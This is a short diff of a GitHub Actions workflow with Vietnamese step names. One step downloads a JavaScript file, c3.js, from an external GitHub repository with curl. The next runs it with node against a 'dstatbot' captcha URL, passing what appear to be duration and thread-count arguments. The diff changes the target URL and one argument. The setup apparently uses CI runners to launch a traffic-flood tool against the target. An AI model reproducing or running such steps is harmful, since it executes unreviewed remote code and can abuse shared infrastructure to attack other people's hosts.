@@ -12,4 +12,4 @@ jobs:
       - name: Lệnh #2
         run: curl -L -o c3.js https://github.com/occhoahihihih/helloworld/raw/refs/heads/main/c3.js
       - name: Lệnh #3
-        run: node c3 https://captcha.dstatbot.win/2f26ea5c-e00a-4e4d-b031-6508b174e75e 260 2
+        run: node c3 https://captcha.dstatbot.win/80d60818-88a9-45fc-886c-d1610c5cf4a9 260 1
